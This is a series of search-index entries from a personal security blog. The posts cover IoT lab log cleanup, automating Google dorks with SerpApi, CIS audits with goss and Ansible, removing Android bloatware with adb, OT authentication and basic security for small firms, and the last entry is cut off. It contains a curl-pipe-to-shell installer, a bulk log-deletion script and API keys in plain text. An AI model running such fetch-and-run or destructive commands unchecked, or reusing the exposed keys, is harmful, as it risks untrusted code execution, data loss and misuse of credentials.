rotate 0 ifempty lastaction /usr/bin/find /var/log/analysis/ -name \u0026#34;tcpdump-*\u0026#34; -mtime +7 -delete endscript } EOF Next logrotate executions will clean obsolete files.\nClean logs Before and after testing an IoT device and its related apps, we probably want to purge old log files. A short script can help to automate this task:\nsudo cat \u0026lt;\u0026lt; EOF \u0026gt; /root/clean.sh #!/bin/bash NEXT_DNS_PROFILE=aaaaaa NEXT_DNS_APIKEY=a8f4e42e896ff37f181e3e8a42a9737e1423d8e7 find /var/log/analysis -type f -exec rm -f {} \\; rm -rf /var/log/analysis/zeek/2* systemctl restart tcpdump systemctl restart dnsmasq systemctl restart rsyslog systemctl restart mitmproxy curl -X \u0026#34;DELETE\u0026#34; --header \u0026#34;X-Api-Key: ${NEXT_DNS_APIKEY}\u0026#34; https://api.nextdns.io/profiles/${NEXT_DNS_PROFILE}/logs EOF Replace the two parameters with your data and run it:\nsudo chmod 755 /root/clean.sh sudo /root/clean.sh Conclusions We built a small and cheap lab to test consumer IoT devices. But the same tools we used can be used in a Threat Hunting scenario or during network analysis (performance, troubleshooting, whatever). Learning Linux means having an invaluable toolkit ready to be used in complex analysis.\nWe are learning how to use this setup in dedicated posts.\n","cover":"/images/categories/personal-security.webp","permalink":"https://www.adainese.it/blog/2022/07/22/building-an-iot-testing-lab/","title":"Building an IoT testing lab"},{"categories":["osint","automation"],"contents":"I usually don\u0026rsquo;t write about OSINT techniques, I think that before approaching OSINT we should speak about ethics and respect. By the way, some OSINT automation techniques are harmless: if you don\u0026rsquo;t know what you have to search for, you won\u0026rsquo;t be able to get anything regardless you are automating or not.\nGoogle Dorks We probably already know Google Dorks: in short, they are some useful parameters to reduce the result. There is a lot of them but I\u0026rsquo;m used to using:\nintitle: limit the search to pages that contains a specific pattern in the title (HTML tag). inurl: limit the search to URLs that contains a specific pattern. site: limit the search to a specific domain or TLD. filetype: limit the search to a specific file type. For example: site:adainese.it filetype:pdf will display all PDF files included in my website.\nBe aware that you should also check my robots.txt .\nManual Google searches If you are used to doing many searches on Google in a short timeframe, you will see that Google tries to interrupt you, especially if you are not authenticated.\nHowever, during OSINT analysis you probably have a set of requests that you want to run on each target.\nFinally, the standard Google output is probably not the best usable data format in the world.\nSerpApi We are using SerpApi, that basically executes each request, possibly solving CAPTCHAs and parsing (web scraping) the Google result in a JSON format. SerpApi supports Google Search, Maps, Jobs, Product, PlayStore, YouTube\u0026hellip; But it also supports DuckDuckGo, Yandex, Ebay, Yahoo\u0026hellip;\nWe need to create an account, and we will have 100 requests/month for free.\nAutomating Google searches Let\u0026rsquo;s try to automate the search mentioned before: site:adainese.it filetype:pdf\nWe can approach the problem using a direct REST API or Python module. Let\u0026rsquo;s see both:\nwget -q -O- \u0026#34;https://serpapi.com/search.json?engine=google\u0026amp;q=site%3Aadainese.it+filetype%3Apdf\u0026amp;api_key=3a8c7f2b5d6e9a1b2c4f7d8e6b9c0a2d3f5e7b1c8d9e0a3f6c5b7d8e9a0c4f1b\u0026#34; | jq { \u0026#34;search_metadata\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;62cc1d3fe93ff4ebb8b22f80\u0026#34;, \u0026#34;status\u0026#34;: \u0026#34;Success\u0026#34;, \u0026#34;json_endpoint\u0026#34;: \u0026#34;https://serpapi.com/searches/c6980a3075b990cb/62cc1d3fe93ff4ebb8b22f80.json\u0026#34;, \u0026#34;created_at\u0026#34;: \u0026#34;2022-07-11 12:53:19 UTC\u0026#34;, \u0026#34;processed_at\u0026#34;: \u0026#34;2022-07-11 12:53:19 UTC\u0026#34;, \u0026#34;google_url\u0026#34;: \u0026#34;https://www.google.com/search?q=site%3Aadainese.it+filetype%3Apdf\u0026amp;oq=site%3Aadainese.it+filetype%3Apdf\u0026amp;sourceid=chrome\u0026amp;ie=UTF-8\u0026#34;, \u0026#34;raw_html_file\u0026#34;: \u0026#34;https://serpapi.com/searches/c6980a3075b990cb/62cc1d3fe93ff4ebb8b22f80.html\u0026#34;, \u0026#34;total_time_taken\u0026#34;: 4.62 }, \u0026#34;search_parameters\u0026#34;: { \u0026#34;engine\u0026#34;: \u0026#34;google\u0026#34;, \u0026#34;q\u0026#34;: \u0026#34;site:adainese.it filetype:pdf\u0026#34;, \u0026#34;google_domain\u0026#34;: \u0026#34;google.com\u0026#34;, \u0026#34;device\u0026#34;: \u0026#34;desktop\u0026#34; }, \u0026#34;search_information\u0026#34;: { \u0026#34;organic_results_state\u0026#34;: \u0026#34;Results for exact spelling\u0026#34;, \u0026#34;query_displayed\u0026#34;: \u0026#34;site:adainese.it filetype:pdf\u0026#34;, \u0026#34;total_results\u0026#34;: 8, \u0026#34;time_taken_displayed\u0026#34;: 0.22 }, \u0026#34;organic_results\u0026#34;: [ { \u0026#34;position\u0026#34;: 1, \u0026#34;title\u0026#34;: \u0026#34;PoC Cyber Range Platform - Andrea Dainese\u0026#34;, \u0026#34;link\u0026#34;: \u0026#34;https://www.adainese.it/files/slides/20200922-cyberrange.pdf\u0026#34;, \u0026#34;displayed_link\u0026#34;: \u0026#34;https://www.adainese.it › 20200922-cyberrange\u0026#34;, \u0026#34;date\u0026#34;: \u0026#34;Sep 22, 2020\u0026#34;, \u0026#34;snippet\u0026#34;: \u0026#34;Rosario is a Cybersecurity professional with around 20 years of experience. Rosario is the. South Europe Cyberbit Sales Engineer and.\u0026#34;, \u0026#34;about_this_result\u0026#34;: { \u0026#34;source\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;adainese.it was first indexed by Google in January 2021\u0026#34; }, \u0026#34;languages\u0026#34;: [ \u0026#34;English\u0026#34; ], \u0026#34;regions\u0026#34;: [ \u0026#34;the United States\u0026#34; ] }, \u0026#34;about_page_link\u0026#34;: \u0026#34;https://www.google.com/search?q=About+https://www.adainese.it/files/slides/20200922-cyberrange.pdf\u0026amp;tbm=ilp\u0026amp;ilps=ADNMCi11pvVrwLJY0LqGhLcTwhibCc9pIw\u0026#34;, \u0026#34;cached_page_link\u0026#34;: \u0026#34;https://webcache.googleusercontent.com/search?q=cache:EhJFMGqqonQJ:https://www.adainese.it/files/slides/20200922-cyberrange.pdf+\u0026amp;cd=1\u0026amp;hl=en\u0026amp;ct=clnk\u0026amp;gl=us\u0026#34; }, [...] Good but we can do better with a script. Maybe we want to download all PDF files included in the result. Before, remember to install the Python module:\npip3 install google-search-results Finally, customize the following script:\n#!/usr/bin/env python3 import os import json import requests from serpapi import GoogleSearch params = { \u0026#39;engine\u0026#39;: \u0026#39;google\u0026#39;, \u0026#39;q\u0026#39;: \u0026#39;site:adainese.it filetype:pdf\u0026#39;, \u0026#39;api_key\u0026#39;: \u0026#39;3a8c7f2b5d6e9a1b2c4f7d8e6b9c0a2d3f5e7b1c8d9e0a3f6c5b7d8e9a0c4f1b\u0026#39; } search = GoogleSearch(params) result = search.get_json() with open(\u0026#39;search_result.json\u0026#39;, \u0026#39;w\u0026#39;) as outfile: json.dump(result, outfile) for organic_result in result[\u0026#39;organic_results\u0026#39;]: link = organic_result[\u0026#39;link\u0026#39;] filename = os.path.basename(link) r = requests.get(link, allow_redirects=True) open(filename, \u0026#39;wb\u0026#39;).write(r.content) And we will get the JSON (for future references) and all PDF files downloaded in the current directory.\nYou probably know that acting in that way is pretty\u0026hellip; noisy. You should evaluate the countermeasures to remain hidden.\n","cover":"/images/categories/osint.webp","permalink":"https://www.adainese.it/blog/2022/07/17/automating-google-searches/","title":"Automating Google searches"},{"categories":["automation","security"],"contents":"Security assessments are part of my daily job, and automation is part of my mindset. CIS Controls provides a set of standard controls that should be checked on\u0026hellip; anything. To be specific CIS also provides a benchmark (a sort of step-by-step guide) for many environments. Moreover, Lockdown Enterprise delivers a set of Ansible playbooks ready to be used.\nIn this post, we\u0026rsquo;ll see how to check CIS controls on Ubuntu 20.04 servers and remediate them.\nAudit phase We know that Ansible playbooks are good to remediate, but sometimes reporting is not so good as well. Lockdown Enterprise used goss to provide good audit reports.\nLet\u0026rsquo;s install goss and clone the Git repository into a Ubuntu Linux 20.04 system:\nsudo curl -fsSL https://goss.rocks/install | sh git clone https://github.com/ansible-lockdown/UBUNTU20-CIS-Audit /var/tmp/UBUNTU20-CIS-Audit cd /var/tmp/UBUNTU20-CIS-Audit We can audit the entire system using the provided script:\n$ sudo ./run_audit.sh ## Pre-Checks Start OK Audit binary /usr/local/bin/goss is available OK /var/tmp/UBUNTU20-CIS-Audit/goss.yml is available ## Pre-checks Successful ############# Audit Started ############# \u0026#34;summary\u0026#34;: { \u0026#34;failed-count\u0026#34;: 154, \u0026#34;summary-line\u0026#34;: \u0026#34;Count: 372, Failed: 154, Duration: 91.345s\u0026#34;, \u0026#34;test-count\u0026#34;: 372, \u0026#34;total-duration\u0026#34;: 91344507858 } } Completed file can be found at /var/tmp/audit_linux-station_1657459563.json ############### Audit Completed ############### We can also run goss manually on a subset of controls:\nsudo goss --vars /var/tmp/UBUNTU20-CIS-Audit/vars/CIS.yml -g /var/tmp/UBUNTU20-CIS-Audit/section_1/cis_1.1/cis_1.1.1.1_7.yml validate sudo goss --vars /var/tmp/UBUNTU20-CIS-Audit/vars/CIS.yml -g /var/tmp/UBUNTU20-CIS-Audit/section_1/cis_1.1/cis_1.1.1.1_7.yml validate -f documentation Remember that by default the server profile will be used. To audit with the workstation profile using:\nsudo ./run_audit.sh -w Remediation phase Once we have completed the audit, we can analyze the non-compliant items, evaluate the risk and decide if we want to remediate them.\nFrom our Ansible server, clone the Ansible repository:\ngit clone https://github.com/ansible-lockdown/UBUNTU20-CIS cd UBUNTU20-CIS The following Ansible commands may vary depending on your Ansible infrastructure. We can remediate all controls with:\nansible-playbook -i inventory.ini -u andrea -b -k -K site.yml All controls should be remediated just after the OS installation. For production environments, we probably want to remediate single controls with:\nansible-playbook -i inventory.ini -u andrea -b -k -K --tags rule_1.1.1.1 site.yml Be sure you are using the -C flag during the first run.\nReferences CIS Critical Security Controls CIS Ubuntu Linux Benchmarks Lockdown Enterprise Ansible Lockdown CIS Ansible playbook for Ubuntu by Lockdown Enterprise Audit script for Ubuntu by Lockdown Enterprise Goss - Quick and Easy server validation ","cover":"/images/vendors/cis.webp","permalink":"https://www.adainese.it/blog/2022/07/15/automatic-cis-controls-check-with-ansible/","title":"Automatic CIS controls check with Ansible"},{"categories":["personal-security","notes"],"contents":"I have a \u0026ldquo;landline\u0026rdquo; VoIP number, used by my parents to reach me when my phone is turned off. Apparently, landlines number are preferred by spammers, so I wrote a simple firewall zero-trust configuration for my FRITZ!Box.\nThe firewall is permitting all numbers included in the address book.\nLet\u0026rsquo;s see how to configure it:\nAdd all trusted numbers to the phone book (Telephony \u0026gt; Telephone Book). Optionally configure an answering machine (Telephony \u0026gt; Answering Machine). Configure the firewall (Telephony \u0026gt; Call Handling \u0026gt; Call Diversion) as follows: In my case:\nall trusted incoming calls are routed to a telephone connected to port FON1; the answering machine on FRITZ!Box is disabled; I\u0026rsquo;m using the answering machine provided by the VoIP provider. ","cover":"/images/categories/personal-security.webp","permalink":"https://www.adainese.it/blog/2022/07/13/home-phone-call-firewall/","title":"Home phone call firewall"},{"categories":["personal-security"],"contents":"I had an interesting chat with a friend: he was reporting to me that his photovoltaic management app wasn\u0026rsquo;t working anymore. The vendor upgraded the Cloud API breaking compatibility with older products. I expect this more and more in the future.\nHow firms are developing API I worked many years with developers. In my experience, once a project is started, developers start to analyze, choose the proper framework, build the software test it maybe with some CI/CD approach and everything is fine. But\u0026hellip; sooner or later the framework will become obsolete, so the libraries, so the operating systems. And sooner or later new OS will not be compatible with the old version of the frameworks, and probably the code won\u0026rsquo;t be compatible with new versions of the framework too.\nTo me, this is a small form of \u0026ldquo;lock-in\u0026rdquo;: the developed software (of course) is bound to a specific version of a specific framework installable on a specific operating system. Sooner or later, upgrading the whole ecosystem will require a deep code review and update.\nAnd that\u0026rsquo;s the problem.\nProduct lifecycle What is missing from the beginning is the product lifecycle. It\u0026rsquo;s not about developers, it\u0026rsquo;s about product management and business strategy. If we are developing a new cloud-based game, we can assume that it will stand for a few years:\nThe cloud infrastructure, API, and software must be maintained, or the business will ve impacted: a data breach or an outage will impact the app\u0026rsquo;s reputation, the customers, and the revenues.\nAt some point, the app is retired, simply because revenues won\u0026rsquo;t cover major upgrades and infrastructures.\nAs we said, a game will stand for a few years, I guess no more than 3 years.\nSometimes we will see a new product replacing the old one, in that case, customers are usually migrated to the new products with some sort of special offers.\nThe IoT problem With IoT, ICS/OT, medical devices, automotive, and building automation products\u0026hellip; the playground changes: customers buy products that can be expensive, and those products are expected to stand for many years: 10 years is expected for consumer products, 20 years is expected for industrial/medical products and automotive.\nHow can we manage a 20 years product lifecycle based on a 5 years OS lifecycle?\nShort story: we can\u0026rsquo;t.\nLong story: the problem must be decoupled. We have the device and the cloud services. We could maintain the cloud services, with expensive major upgrades and maintain the API compatibility with legacy devices. That means we must carefully design our API and security from the beginning. We could maintain firmware for legacy devices, fixing security bugs even for 15 years old products. But we can\u0026rsquo;t stop the world: for example, security protocols will be replaced and we cannot influence that. If a security protocol (TLS 1.0) is deprecated secure communications won\u0026rsquo;t be permitted anymore unless we upgrade both devices and API services. But legacy devices probably won\u0026rsquo;t support larger firmware.\nStandard Relased in Deprecated in Wired Equivalent Privacy (WEP) 1997 2004 Wi-Fi Protected Access (WPA) 2003 2006 Wi-Fi Protected Access 2 (WPA2) 2004 - Wi-Fi Protected Access 3 (WPA3) 2018 - SSL 2.0 1995 2011 SSL 3.0 1999 2015 TLS 1.0 1999 2021 TLS 1.1 2006 2021 TLS 1.2 2008 - TLS 1.3 2018 - Bluetooth 1.0B 1999 2006 Bluetooth 1.1 2001 2006 Bluetooth 1.2 2003 2009 Bluetooth 2.0 2004 2019 Bluetooth 2.1 2007 2019 Bluetooth 3.0 2009 2019 Bluetooth 4.0 2010 2019 Bluetooth 4.1 2013 2019 Bluetooth 4.2 2014 2025 Bluetooth 5 2016 2027 Bluetooth 5.1 2019 2029 Bluetooth 5.2 2019 2030 Bluetooth 5.3 2021 2031 If you wonder how many SSL 3.0 enabled webservers are currently running on the Internet:\nIn the industrial sector, we know that we are facing unsupported systems and applications, and we can secure them by working on the perimeter. With consumer IoT and building automation, the story is different\u0026hellip;\nThe revenues and the Ponzi method Let\u0026rsquo;s focus again on consumer IoT devices. My friend made an interesting assumption:\nIt\u0026rsquo;s like a Ponzi scheme, in which the last users are paying for the whole infrastructure.\nThe consumer IoT business model is usually based on product selling. Nobody is willing to monthly pay for (example) remote air cooling management. But air cooling systems are expected to work for 10 years. So latter users, buying products, are paying the whole infrastructure.\nYes, the vendors are also acquiring data (telemetry) but I\u0026rsquo;m not sure the value of that data is paying for the whole infrastructure (servers, development, licenses, software, security assessments, audit, and compliance\u0026hellip;).\nA possible solution? We know that:\nNo software can stand for 10 years. That\u0026rsquo;s an assumption, but feel free to bring your experience. At some point infrastructure and development will require major antieconomic upgrades. Collected data (telemetry) are interesting but are not paying for the whole infrastructure. Infrastructure costs and the Ponzi scheme is not working. We are facing the same issue on ICS/OT. And my solution involves a similar approach I\u0026rsquo;m using in ICS/OT: protect the perimeter. Right now there is no reason why some consumer devices need to be cloud-connected. Let\u0026rsquo;s open and document the API so home automation hubs can include and manage them. Hubs will be responsible to protect the home perimeter, without needing the cloud.\nYes, this is not covering all device types, but at least home devices can be managed and maintained without invasive cloud services.\nConclusions Right now I\u0026rsquo;m 100% sure that any cloud-based IoT device can die in a few years. And also I\u0026rsquo;m worried about my data: I prefer to limit my home security perimeter avoiding cloud services. Moreover, I suspect that we are data-addicted: do we need to see our energy consumption anywhere and anytime?\n","cover":"/blog/2022/07/11/discontinued-iot-products/hype-cycle.webp","permalink":"https://www.adainese.it/blog/2022/07/11/discontinued-iot-products/","title":"Discontinued IoT products"},{"categories":["personal-security"],"contents":"Following an idea of Micheal Bazzel , I decided to write a short procedure to remove unwanted software from Android smartphones. It\u0026rsquo;s not only about cleaning the phone, it\u0026rsquo;s about privacy. My old approach required a rootable phone, this one doesn\u0026rsquo;t and doesn\u0026rsquo;t affect the warranty.\nUninstalled packages will be kept in the ROM, but they are removed from the running OS.\nBe aware: you should not remove any software you suspect because you are probably making your phone unusable and only a hard reset will fix it.\nConnect your phone Install Android Debug Bridge (ADB) on your platform. The following commands work on Raspberry Pi OS:\nsudo apt install android-tools-adb Now enable USB Debugging mode. Go to Settings \u0026gt; About Phone \u0026gt; Software Information and click 7 times on Build Number, then go to Settings \u0026gt; Developer Options \u0026gt; Enable \u0026gt; USB Debugging and enable it.\nConnect the phone via USB cable to your computer and restart ADB:\nadb kill-server adb devices - daemon not running; starting now at tcp:5037 - daemon started successfully List of devices attached 520011a1a0123143 device Let\u0026rsquo;s get the ID of the current user (usually 0):\nadb shell pm list users Users: UserInfo{0:+39 333 000 1234:13} running Now we can:\nlist installed and uninstalled packages (list packages); uninstall a package (uninstall); disable a package (pm disable-user): reinstall a package (install-existing); enable a package (enable). Android sanitization Let\u0026rsquo;s find some unwanted packages, for example, let\u0026rsquo;s assume we want to remove some social networks apps:\nadb shell pm list packages --user 0 | egrep -i \u0026#34;linkedin|microsoft\u0026#34; | cut -d \u0026#34;:\u0026#34; -f2 | sort com.facebook.appmanager com.facebook.katana com.facebook.services com.facebook.system com.linkedin.android Then uninstall them one by one:\nadb shell pm uninstall -k --user 0 com.linkedin.android Or, maybe, we want to script our task:\nPKGS_TO_UNINSTALL=$(adb shell pm list packages --user 0 | egrep -i \u0026#34;linkedin|microsoft\u0026#34; | cut -d \u0026#34;:\u0026#34; -f2) for P in $PKGS_TO_UNINSTALL; do adb shell pm uninstall -k --user 0 $P; done Disabling an app marks it unavailable (which can easily be reverted), while uninstalling physically removes the app and all connected data from the device. The flag -k keep the data and cache directories around after package removal.\nRestoring a critical app In my test I removed some critical apps. We can restore them without issues:\nadb shell cmd package install-existing com.linkedin.android adb shell pm enable com.linkedin.android Finding app info Besides some famous apps, on most of them, we have to find some additional information. I automated this long task by writing a simple Python scripts:\n#!/usr/bin/env python3 import requests from lxml.html import fromstring with open(\u0026#39;package_list.txt\u0026#39;) as f: lines = f.readlines() print(\u0026#34;Package,Name,Author,Category\u0026#34;) for line in lines: package_name = line.strip() package_title = \u0026#39;N/A\u0026#39; package_author = \u0026#39;N/A\u0026#39; package_category = \u0026#39;N/A\u0026#39; url = f\u0026#39;https://apkcombo.com/en/visionprovider/{package_name}/\u0026#39; r = requests.get(url) if r.status_code == 200: tree = fromstring(r.content) information_table = tree.xpath(\u0026#34;//div[@class=\u0026#39;information-table\u0026#39;]\u0026#34;).pop() package_title = tree.findtext(\u0026#39;.//title\u0026#39;).split(\u0026#39; APK \u0026#39;)[0] try: package_author = information_table.xpath(\u0026#34;//a[contains(@href,\u0026#39;developer\u0026#39;)]\u0026#34;)[0].text except: pass try: package_category = information_table.xpath(\u0026#34;//a[contains(@href,\u0026#39;category\u0026#39;)]\u0026#34;)[3].text except: pass print(f\u0026#39;{package_name},{package_title},{package_author},{package_category}\u0026#39;) We can now lookup app details for each installed app:\nsudo apt install python3-pip pip3 install lxml -U adb shell pm list packages -u | cut -d\u0026#34;:\u0026#34; -f2 \u0026gt; package_list.txt ./app_resolver.py \u0026gt; package_list.csv Finding the uninstalled app Finally, we want to save the list of uninstalled apps. If we used the above commands and flags, we can list installed packages, list installed and uninstalled packages, and compare them:\nadb shell pm list packages \u0026gt; a adb shell pm list packages -u \u0026gt; b diff a b | grep \u0026#34;^\u0026gt;\u0026#34; | cut -d\u0026#34;:\u0026#34; -f2 | sort From my testing devices I removed:\nPackage Name Author Category com.android.email HUAWEI Email HUAWEI Tools com.android.mediacenter Huawei Music Huawei Internet Services Tools com.example.android.notepad NotePad Xiaomi Inc. Tools com.facebook.appmanager N/A N/A N/A com.facebook.katana Facebook Meta Platforms Inc. com.facebook.services Facebook Services Samsung Electronics Co., Ltd. Tools com.facebook.system Facebook App Installer Samsung Electronics Co., Ltd. Tools com.google.android.apps.docs Google Drive Google LLC Productivity com.google.android.apps.photos Google Photos Google LLC Photography com.google.android.apps.tachyon Google Duo Google LLC Communication com.google.android.music Google Play Music Google LLC Music \u0026amp; Audio com.google.android.videos Google TV Google LLC Video Players \u0026amp; Editors com.google.android.youtube YouTube Google LLC Video Players \u0026amp; Editors com.huawei.android.mirrorshare Wireless projection HUAWEI Tools com.huawei.android.totemweather HUAWEI Weather Huawei Tools com.huawei.appmarket Huawei AppGallery Huawei Tools com.huawei.compass Huawei Compass Uploader Tools com.huawei.hidisk Huawei File Manager Huawei Internet Services Tools com.huawei.hwdetectrepair Smart diagnosis Huawei Internet Service Tools com.huawei.hwid Huawei Mobile Services Huawei Internet Services Tools com.huawei.mirror N/A N/A N/A com.huawei.phoneservice HiCare Huawei Internet Services Tools com.huawei.search HUAWEI HiSearch HUAWEI Tools com.huawei.systemmanager HUAWEI Optimizer HUAWEI Tools com.huawei.vassistant HiVoice HUAWEI Tools com.linkedin.android LinkedIn LinkedIn Business com.microsoft.office.excel Microsoft Excel Microsoft Corporation Productivity com.microsoft.office.powerpoint Microsoft PowerPoint Microsoft Corporation Productivity com.microsoft.office.word Microsoft Word Microsoft Corporation Productivity com.microsoft.skydrive Microsoft OneDrive Microsoft Corporation Productivity com.microsoft.translator Microsoft Translator Microsoft Corporation Productivity com.nuance.swype.emui Swype for Huawei Nuance Communications, Inc Tools com.samsung.android.app.spage Bixby Home Samsung Electronics Co., Ltd. Tools com.samsung.android.bbc.fileprovider KnoxBBCProvider Samsung Electronics Co., Ltd. Tools com.samsung.android.lool Samsung Device Care Samsung Electronics Co., Ltd. Tools com.samsung.knox.securefolder Secure Folder Samsung Electronics Co., Ltd. Business com.samsung.android.scloud Samsung Cloud Samsung Electronics Co., Ltd. Tools com.samsung.android.securitylogagent SecurityLogAgent Samsung Electronics Co., Ltd. Tools com.samsung.android.visionintelligence Bixby Vision Samsung Electronics Co., Ltd. Tools com.sec.android.app.samsungapps Samsung Galaxy Store Samsung Electronics Co. Ltd Entertainment com.sec.enterprise.knox.shareddevice.keyguard SharedDeviceKeyguard Samsung Electronics Co., Ltd. Tools com.sec.spp.push Samsung Push Service Samsung Electronics Co., Ltd. Communication com.topjohnwu.magisk Magisk topjohnwu Tools de.axelspringer.yana.zeropage upday upday GmbH \u0026amp; Co. KG News \u0026amp; Magazines me.twrp.twrpapp Official TWRP App Team Win LLC Tools Conclusions I honestly hate bloatware. They impact my privacy by tracking and stealing data. I think that this is a good method to disable unwanted software. It\u0026rsquo;s not a perfect method because we will never know what exactly is installed in our phones, but it\u0026rsquo;s an easy and affordable method for many people.\nThere are other methods, but they are for advanced users.\nReferences Android Sanitization How to Remove Samsung Bloatware without Root (ADB) Uninstall System Apps on Huawei and Honor Devices \u0026ldquo;Uninstall System Apps on Huawei and Honor Devices\u0026rdquo;) ","cover":"/images/categories/personal-security.webp","permalink":"https://www.adainese.it/blog/2022/07/09/sanitize-personal-android-devices/","title":"Sanitize personal Android devices"},{"categories":["ot-ics","security","ciso"],"contents":"I\u0026rsquo;m discussing the IEC 62443 certification with an organization: that build and sell ICS plants which are risky from a safety perspective. They currently comply with the Machinery Directive (Directive 2006/42/EC of the European Parliament), but they are not considering the Cyber risk. If today is not mandatory, more and more customers are requesting some \u0026ldquo;security\u0026rdquo; compliance.\nWithout reinventing the wheel I chose the IEC 62443 framework as a guideline to evaluate the AS-IS and define the next steps.\nIEC 62443 is very complete, but in this post, I want to focus on AAA: Authentication, Authorization, and Accounting.\nUser authentication in OT (and medical devices) AAA functions are described in many parts of IEC 62443 (on both system and component levels). Let\u0026rsquo;s see some requirements from IEC 62443-3-3 (I\u0026rsquo;m quoting a few of them just as examples):\nSecurity measures shall not adversely affect essential functions of a high availability IACS unless supported by a risk assessment. (Support of essential functions) The control system shall provide the capability to identify and authenticate all human users. This capability shall enforce such identification and authentication on all interfaces which provide human user access to the control system to support segregation of duties and least privilege in accordance with applicable security policies and procedures. (SR 1.1 – Human user identification and authentication) The control system shall provide the capability to employ multifactor authentication for human user access to the control system via an untrusted network (SR 1.1 RE 2 – Multifactor authentication for untrusted networks) Automatic denial of access for control system operator workstations or nodes should not be used when immediate operator responses are required in emergency situations. (SR 1.11 – Unsuccessful login attempts) The control system shall provide the capability to limit the number of concurrent sessions per interface for any given user (human, software process or device) to a configurable number of sessions. (SR 2.7 – Concurrent session control) The control system shall provide the capability to centrally manage audit events and to compile audit records from multiple components throughout the control system into a system-wide (logical or physical), time-correlated audit trail [\u0026hellip;] (SR 2.8 RE 1 – Centrally managed, system-wide audit trail, IEC 62443)\nWe have similar requirements for medical devices.\nIn short:\nAAA must be implemented in the proper way (user and non-user access must be authenticated, authorized, and logged). In some cases additional security measures may be required (MFA). Emergency access (firecall) must be provided. Security measures cannot impact essential functions. The above sentences may sound contradictory, but we are missing an important piece: the context.\nThe context In the real world plants and medical devices are installed in specific contexts. Most of them are installed in a restricted area where only authorized personell can enter and operate. Under emergency operations, they must operate as fast as possible. Moreover, we should differentiate security measures for reading, writing, and administrative operations.\nI often see remote access to plants and medical devices for service assistance.\nFinally, we need to evaluate the risk of information available on HMI (for both local and remote access). Medical devices are more critical, but ICS HMIs can store confidential information (recipes, production details\u0026hellip;).\nAn hypothetical approach I don\u0026rsquo;t have the magic recipe that can fit any organization, but we could make some assumptions:\nSetting the same PIN/password for any HMI/user is useless and doesn\u0026rsquo;t comply with IEC 62443 (users must be identified). In a restricted area a read-only view may not require authentication. There are also some remote connections that may not require a username/password authentication. For example, remote control rooms could be authenticated via IP/VPN and require stronger authentication only for write or administrative operations. Fast emergency access must be guaranteed. Any remote user must be identified with a strong authentication method (user, password, MFA). Security measures cannot affect essential functions, thus we can offload AAA to external devices (firewalls, captive portals, NACs\u0026hellip;) Post-incident analysis involving casualties The most critical situation a plant can face is the ones that involve casualties or physical damage. In those cases, we need to find out the root cause analysis and collect evidence that can help the investigation.\nHere comes the logging and its security features: integrity and availability. Any event should be logged and made it permanent. The events I would log include:\nAccess (unauthenticated) Authentication, Authorization Event logging and Accounting Chat (especially during service assistance) Software and configuration changes Output of integrity tests (systems and components) State of each component (especially during service assistance) The manufacturer should consider WORM media for accounting:\nThe control system shall provide the capability to determine whether a given human user took a particular action. (SR 2.12 – Non-repudiation)\nIn a specific event, a good logging platform with WORM media helped to prove that casualties were caused by the customer and not by the manufacturer.\nConclusions I often see OT and medical devices protected by simple PINs. Every time I\u0026rsquo;m asking why they are using the same 5 digits PIN shared between any authorized users and may be known by much much more. Blind compliance is useless, if we don\u0026rsquo;t evaluate the context we are not protecting a device, we are just scrolling a checklist.\n","cover":"/images/categories/ot-ics.webp","permalink":"https://www.adainese.it/blog/2022/06/15/securing-user-authentication-under-iec-62443-in-ot/","title":"Securing user authentication under IEC 62443 in OT"},{"categories":["ciso"],"contents":"Managing Cybersecurity is expensive, we all know that. But not managing it is also more expensive. Given my experience, an SME recovers from a critical Cyberattack in 5-10 days, if it can recover (yes I also personally know companies that lost everything because of a Cyberattack).\nSo how we can conjugate an SME with a minimal effective Cybersecurity strategy?\nTo plan a strategy, we need to fully understand common Cyberattacks and Threat actors.\nSME, Threat Actors, and Cyberattacks First, let\u0026rsquo;s try to describe an SME:\nprivately owned (I often find a single owner); manufacturing sector; a maximum of 150 employees (most of them are working in production); a maximum of $50 million annual receipts; very small or outsourced IT department; low IT budget; low Cybersecurity awareness (management often doesn\u0026rsquo;t want to be bored with security topics); increasing security compliance requirements. SMEs need to protect:\nproduction; CRM; intellectual property. Threat actors targeting SMEs probably want to:\ncompromise and ask for ransom (usually); steal intellectual properties (seldom); sabotage them (rarely). Based on the above assumptions, the most frequent type of Cyberattack is a ransomware-based attack.\nLifecycle of a ransomware attack The New Zealand CERT describes the Lifecycle of a ransomware attack .\nIn short, we have 4 ways the attacker gets inside organizations:\nPhishing Password guessing Exploit vulnerability Email We should notice that 3 out 4 are person based attacks: attackers, using social engineering techniques, try to:\nsteal valid credentials persuading people to insert them in malicious web portals; guess the password using a public data breach and assuming people reuses passwords; persuade people to download and execute malware to take control of computers inside the organization. Designing an effective Cybersecurity strategy Based on the most probable attack, we can now design an effective Cybersecurity strategy to reduce the risk. Always remind that we are talking about SMEs, so our budget is limited.\nWe can mitigate the risk of an attacker getting inside the organization as following:\nTechincal measures: Multi-Factor Authentication: we want MFA for email access and remote access VPNs (mitigate Phishing, Password guessing). Antispam: we want to filter out malicious emails (mitigate Phishing, Email). Logging: we want to detect invalid login attempts (mitigate Password guessing). Security Assessment: we want to detect vulnerabilities via VA, DAST, and PT (mitigate Exploit vulnerability). Patching: we want up-to-date applications and because the IT department is very small we want it to happen automatically (mitigate Exploit vulnerability). Endpoint Detection Response: we want a good EDR to stop malware (mitigate Email); Segregation: we want well-configured network/host-based firewalls which drop incoming and outgoing malicious connections (mitigate last attack phases); Data Protection: we want that in the worst-case scenario, we can get our data back (mitigate the last attack phase); Organizational measures: Policies and procedures: we want to enforce password security (mitigate Password guessing). Training: we want to test how employees are good at detecting social engineering attacks (mitigate Phishing, Email). Conclusions I think that is the minimal set of technical and organizational measures that any organization should implement to reduce the risk of Cyberattacks. Even very small organizations should evaluate the security controls described above.\nReferecense Lifecycle of a ransomware attack ","cover":"/images/categories/ciso.webp","permalink":"https://www.adainese.it/blog/2022/05/25/what-does-it-take-to-secure-any-sme-organization/","title":"What does it take to secure any SME organization?"},{"categories":["ciso"],"contents":"Many companies (hopefully) are collecting logs in a central system. The reason besides that is for compliance and sometimes for root cause analysis. In this post, I want to recap that log management is not just about log collections, and why and how the process should be designed.\nWhy do we collect logs? In short log management is about collecting logs, and storing them for analysis. By design any system is logging locally, so we need to clarify why we want a formal process for log management.\nLet\u0026rsquo;s start from the compliance part: log management is mentioned in ISO 27001 Annex A 12.4.\nEvent logs should be produced, retained, and regularly reviewed to record user activities, exceptions, defects, 